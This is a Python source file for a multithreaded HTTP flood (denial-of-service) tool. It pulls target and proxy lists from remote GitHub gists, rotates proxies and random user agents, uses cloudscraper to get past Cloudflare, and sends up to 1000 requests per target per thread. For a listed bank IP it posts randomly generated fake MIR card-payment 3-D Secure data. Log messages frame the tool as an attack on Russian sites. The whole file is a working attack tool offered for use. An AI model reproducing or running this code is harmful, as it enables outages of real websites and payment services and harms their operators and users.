# -*- coding: utf-8 -*-
from datetime import datetime, timedelta
import json

import cloudscraper
import requests
import string
import os

from urllib.parse import unquote, urlparse
from copy import deepcopy
from gc import collect
from loguru import logger
import time
import sys
from sys import stderr
from threading import Thread, Lock
from random import choice
from random import randint
from random import random
from time import sleep
from urllib3 import disable_warnings
from pyuseragents import random as random_useragent
from json import loads
from queue import Queue

disable_warnings()
logger.remove()
#logger.add(stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
logger.add(sys.stdout, colorize=True, format="<green>{time:HH:mm:ss}</green> <level>{message}</level>")
# logger.add(sys.stdout, colorize=True, format="<green>{time}</green> {extra[proxy]} {extra[target]} {extra[err_code]} {extra[err_count]} <level>{message}</level>")
# logger.add(sys.stdout, serialize=True)
threads = int(input('Кількість потоків: '))


ALLOVED_PAREQ_CHARS = string.ascii_letters + string.digits
ALLOVED_MD_CHARS = string.digits

BANK_IPS = ["https://185.170.2.7"]
MAX_REQUESTS = 1000

SITES = None
PROXIES = None


def base_scraper():
    scraper = cloudscraper.create_scraper(browser={'browser': 'firefox',
                                                   'platform': 'android',
                                                   'mobile': True},)
    scraper.headers.update({
            'Content-Type': 'application/json',
            'cf-visitor': 'https',
            'User-Agent': random_useragent(),
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ru',
            'x-forwarded-proto': 'https',
            'Accept-Encoding': 'gzip, deflate, br'})

    return scraper


def generate_MIR_data(url):
    dat = {}
    dat["PaReq"] = ''.join([choice(ALLOVED_PAREQ_CHARS) for _ in range(490)])
    dat["MD"] = ''.join([choice(ALLOVED_MD_CHARS) for _ in range(10)])
    dat["TermUrl"] = "https%3A%2F%2F" + urlparse(url).netloc
    return dat


def mainth(protocol, cur_proxy, proxy_name, region, queue_counters, sites):
    # Fetching data with proxy and targets

    counter403 = {}

    counter_total = 0

    while True:
        counter_total += 1
        if counter_total > 10000:
            sites = get_sites()
            proxies = get_proxies()
            (protocol, cur_proxy, proxy_name, region) = choice(proxies)
            logger.info("NEW PROXY SELECTED")
        scraper = base_scraper()
        # logger.info("GET RESOURCES FOR ATTACK")
        # data = choice(sites)
        if len(sites) <= 0:
            logger.info("MOSKALI SOSUT! ATTACK WILL BE RESTARTED IN FEW MINUTES")
            sleep(300)
            counter_total = 100500
            continue
            # with open('list.txt') as f:
            #     sites = f.read().splitlines()

        index_ = randint(0, len(sites) - 1)
        current_target = sites[index_]
        if not current_target.startswith(protocol):
            sites.pop(index_)
            continue

        if region != 'all' and current_target.find(region) < 0:
            sites.pop(index_)
            continue

        scraper.proxies.update({'http': cur_proxy,
                                'https': cur_proxy})

        # logger.info("STARTING ATTACK TO " + current_target)
        for _ in range(MAX_REQUESTS):
            response = {}
            try:
                if current_target in BANK_IPS:
                    response = scraper.post(current_target,
                                            generate_MIR_data(current_target))
                else:
                    response = scraper.get(current_target)
                queue_counters.put({'proxy': proxy_name, 'target': current_target, 'status': response.status_code, 'value': 1})

                if response.status_code == 404 or ((current_target in counter403) and (counter403[current_target] >= 30)):
                    sites.pop(index_)
                    break
                if response.status_code == 403 or (500 <= int(response.status_code) < 600):
                    if current_target not in counter403:
                        counter403[current_target] = 0
                    counter403[current_target] += 1
                else:
                    if current_target in counter403 and counter403[current_target] > 0:
                        counter403[current_target] -= 1

            except BaseException as err:
                # logger.warning("GOT ISSUE WHILE ATTACKING " + current_target)
                queue_counters.put({'proxy': proxy_name, 'target': current_target, 'status': 'e', 'value': 1})
                try:
                    sites.pop(index_)
                except BaseException:
                    ...
                finally:
                    break


def cleaner():
    while True:
        sleep(60)
        collect()


def get_sites():
    # with open('list.txt') as f:
    #     sites = f.read().splitlines()
    # return sites
    logger.info('Getting targets...')
    sites_ = []
    try:
        sites_ = loads(requests.get("https://gist.github.com/Mekhanik/3d90e637a86401bf726b489d2adeb958/raw/tg?a=" + str(random())).content)
        SITES = deepcopy(sites_)
    except BaseException:
        if SITES:
            sites_ = deepcopy(SITES)
        else:
            exit(1)
    # logger.info(json.dumps(sites, indent=4))
    return sites_


def get_proxies():
    # return [
    #     ('http://', 'http://193.23.50.206:11335', 'mobile', 'all', ),
    #     # ('https://', 'http://193.23.50.164:10215', 'residental', '.ru', ),
    #     ('https://', 'socks5://193.23.50.164:10216', 'socks', 'all', ),
    #     # ('http://', 'http://143.110.243.165:10815', 'mobile', 'all', ),
    #     # ('https://', 'http://109.248.7.93:11108', 'residental', 'all',),
    # ]
    logger.info('Getting proxies...')
    proxies_ = None
    try:
        proxies_ = loads(requests.get("https://gist.githubusercontent.com/Mekhanik/6d36aa2f722b3fd957ca5521ce0242b2/raw/px?a=" + str(random())).content)
        PROXIES = deepcopy(proxies_)
    except BaseException:
        if PROXIES:
            proxies_ = deepcopy(PROXIES)
        else:
            exit(2)
    return proxies_


# def pbar(window):
#     str_num = 1
#     for targets, proxy in counter_by_sites:
#         str_num += 1
#         window.addstr(y=str_num, str=proxy)
#     window.refresh()
#     time.sleep(3)


def stat_visualiser(queue_counters):
    counter_by_sites = {}
    reset_time = datetime.now() + timedelta(minutes=60)
    while True:
        while queue_counters.qsize() > 0:
            rec = queue_counters.get(block=True)
            if rec['proxy'] not in counter_by_sites:
                counter_by_sites[rec['proxy']] = {}
            if rec['target'] not in counter_by_sites[rec['proxy']]:
                counter_by_sites[rec['proxy']][rec['target']] = {}
            if rec['status'] not in counter_by_sites[rec['proxy']][rec['target']]:
                counter_by_sites[rec['proxy']][rec['target']][rec['status']] = 0
            counter_by_sites[rec['proxy']][rec['target']][rec['status']] += rec['value']
            queue_counters.task_done()
        # logger.info(json.dumps(counter_by_sites, indent=4))
        str_ = ''
        for proxy, targets in counter_by_sites.items():
            str_ += "\n" + proxy + "\n"
            for target, codes in targets.items():
                parsed = urlparse(target)
                str_ += parsed.scheme + '://' + parsed.netloc
                for code, count in codes.items():
                    str_ += f" {code}:{count}"
                str_ += " | "
        logger.info(str_)
        time.sleep(5)
        if datetime.now() > reset_time:
            counter_by_sites = {}
            reset_time = datetime.now() + timedelta(minutes=60)
        os.system('clear')


if __name__ == '__main__':
    queue_counters = Queue()
    proxies = get_proxies()
    sites = get_sites()
    for _ in range(threads):
        args_ = choice(proxies)
        Thread(target=mainth, args=args_ + [queue_counters, sites]).start()

    Thread(target=cleaner, daemon=True).start()
    Thread(target=stat_visualiser, args=(queue_counters, )).start()
